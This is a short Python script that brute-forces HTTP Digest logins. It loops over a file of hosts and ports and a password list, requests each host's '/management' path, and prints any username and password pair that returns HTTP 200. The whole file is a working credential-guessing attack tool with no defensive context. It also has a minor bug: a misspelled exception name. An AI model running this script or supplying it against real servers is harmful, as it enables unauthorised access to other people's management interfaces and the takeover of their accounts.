import requests
from requests.auth import HTTPDigestAuth
import sys
 

PROTO="HTTP"

if len(sys.argv) != 4:
    raise VailueError('Please provide list of hosts, password-list')

#print(f'{sys.argv[0]}')
           
fhost = sys.argv[1]
f1 = open(fhost, "r")
hosts = f1.readlines()

fpass = sys.argv[2]
f2 = open(fpass, "r")
passwords = f2.readlines()

user = sys.argv[3]

for host in hosts:
    data = host.split()
    for passwd in passwords:
        #print("trying {}/{}".format(user,passwd.strip()))
        r = requests.get(PROTO+"://"+data[0]+":"+data[1]+"/management", auth=HTTPDigestAuth(user, passwd.strip()))
        if r.status_code == 200:
            print(r.url)
            print("[+] password found: {}/{}".format(user,passwd.strip()))
            r.close()
            print("")
    
#print(r.content)